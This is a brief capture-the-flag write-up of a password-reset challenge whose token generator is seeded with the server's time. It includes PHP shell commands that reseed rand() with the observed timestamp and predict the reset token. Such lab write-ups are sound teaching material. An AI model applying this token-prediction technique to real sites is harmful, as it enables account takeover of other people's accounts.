# Password reset - Challenge 113

The PRNG is seeded with the time of day, which is terribly insecure.

Since we have the source code and the know what the local time on the server is thanks to the webpage giving us that information, it's trivial to defeat this challenge.

Hit the reset button and write down the time:

`Sun, 07 May 2017 11:31:11 -0400`

1. Start a PHP interactive shell
2. Convert the time to a UNIX timestamp
3. Seed the PRNG with the time
4. Generate our tiken with the same rand() function parameters
5. Submit the token, grab the password and get the flag

```
php > $seedtime = strtotime('Sun, 07 May 2017 11:31:11 -0400');
php > srand($seedtime);
php > $token = rand(1000000000000000,9999999999999999);
php > print $token;
4844268786720932
```
